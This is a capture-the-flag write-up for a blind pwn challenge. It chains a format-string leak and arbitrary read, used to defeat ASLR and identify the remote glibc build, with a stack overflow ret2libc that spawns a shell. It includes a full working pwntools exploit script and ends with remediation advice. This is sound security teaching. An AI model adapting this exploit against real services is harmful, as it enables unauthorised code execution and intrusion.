## Overview

echoland is a Medium **Pwn** challenge that gives you *only* a `nc` service — there is
no binary to download, so every fact about the target has to be recovered from how it
reacts, hence "blind ROP". The path is a [format-string](https://cwe.mitre.org/data/definitions/134.html)
leak to defeat ASLR, an arbitrary read to fingerprint the exact remote libc, and a classic
[stack buffer overflow](https://cwe.mitre.org/data/definitions/121.html) `ret2libc` to land
`system("/bin/sh")`.

## The technique

The service is a tiny "dark cave" menu:

```
🦇 Inside the dark cave. 🦇
1. Scream.
2. Run outside.
> 
```

The important discovery is *where* the bug lives. Anything that isn't a valid option is
handed straight to `printf(input)` in the menu's invalid-choice handler, and then the menu
loops. That gives two primitives from one connection:

- a **read** primitive (`%p` to leak pointers, `%s` to dereference arbitrary addresses), and
- because the menu loops, **unlimited format-string probes without ever reconnecting**.

Option 1 ("Scream") separately reads into a **64-byte stack buffer with no bound**, so it
overwrites the saved return address at offset 72 — the overflow half of the chain.

## Solution

**1. Map the stack.** Send markers with positional specifiers to find where your input
lands and which slots hold useful pointers:

```
CCCCCCCC.%8$p   ->  ...4343434343434343   (our input is at stack index 8)
%12$p           ->  a PIE code pointer
%13$p           ->  a libc code pointer  ==  libc_base + 0x21bf7
```

Subtracting `0x21bf7` from the index-13 leak yields a page-aligned address, confirming the
offset — so a single `%13$p` defeats ASLR.

**2. Fingerprint the libc with no binary.** Different glibc patch builds have different
`system`/`/bin/sh` offsets, and guessing wrong just crashes. With no binary you cannot leak
the GOT, so instead use `%s` as an **arbitrary read** and dump libc's own version string.
With input at index 8, place the target address at index 9:

```python
payload = b"%9$s" + b"BBBB" + p64(libc_base + 0x1bb7a0)
```

which returns:

```
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.4) stable release version 2.27.
```

Download that *exact* `.deb` from launchpad (the security mirror 404s superseded patch
builds) and read the real offsets — `printf@0x64f70` confirms the build.

**3. Leak and overflow in one connection.** ASLR is fixed for the life of a connection, so
the `%13$p` leak and the overflow go together:

Create `solve.py`:

```python
#!/usr/bin/env python3
from pwn import *
import re, sys, time
context.clear(arch='amd64'); context.log_level='info'

HOST = sys.argv[1]; PORT = int(sys.argv[2])

# glibc 2.27-3ubuntu1.4 offsets (remote libc, ID'd via %9$s arb-read of version string)
OFF_LEAK13 = 0x21bf7   # idx13 menu leak = libc_base + this
OFF_SYSTEM = 0x4f550
OFF_BINSH  = 0x1b3e1a
OFF_POPRDI = 0x215bf
OFF_RET    = 0x8aa

r = remote(HOST, PORT)
r.recvuntil(b"> ")

# leak libc via the menu format string (invalid choice -> printf(input))
r.sendline(b"ZZ%13$p")
data = r.recvuntil(b"1. Scream", timeout=5)
leak = int(re.search(rb"ZZ(0x[0-9a-f]+)", data).group(1), 16)
libc = leak - OFF_LEAK13
log.success(f"libc base = {hex(libc)}")
assert libc & 0xfff == 0

system = libc + OFF_SYSTEM; binsh = libc + OFF_BINSH
poprdi = libc + OFF_POPRDI; ret = libc + OFF_RET

r.recvuntil(b"> ")
r.sendline(b"1")                # Scream -> vulnerable unbounded stack read
r.recvuntil(b">> ")
chain  = p64(ret)               # movaps 16-byte stack alignment
chain += p64(poprdi) + p64(binsh) + p64(system)
r.sendline(b"A"*72 + chain)     # 64-byte buf + 8 saved RBP -> saved RIP at 72

r.sendline(b"cat /home/ctf/flag.txt")
time.sleep(1)
print(r.recv(4096).decode(errors='replace'))
r.close()
```

Running it pops a shell and reads the flag:

```
HTB{...}
```

## Why it worked

The root cause is a user-controlled format string — `printf(input)` instead of
`printf("%s", input)` — which hands the attacker both a memory-read oracle (defeating ASLR)
and, in general, an arbitrary write. Paired with an unbounded stack read that clobbers the
saved return address, the leaked libc base is enough to build a `ret2libc` chain that runs
`system("/bin/sh")`. The "blind" twist is only cosmetic: the same `%s` read that leaks a
pointer also reads the libc version string, so a missing binary never blocks the exploit.

## Fix / defense

- Never pass user input as a format string: `printf("%s", input)`, not `printf(input)`.
  Enable `-Wformat-security` / `FORTIFY_SOURCE=2`. ([CWE-134](https://cwe.mitre.org/data/definitions/134.html))
- Bound every stack read (`fgets(buf, sizeof(buf), stdin)`), compile with stack canaries
  (`-fstack-protector-strong`), full RELRO, PIE and NX. Note that all of those were present
  here — a format-string leak defeats ASLR regardless, which is why the format string is the
  real bug to fix. ([CWE-121](https://cwe.mitre.org/data/definitions/121.html))
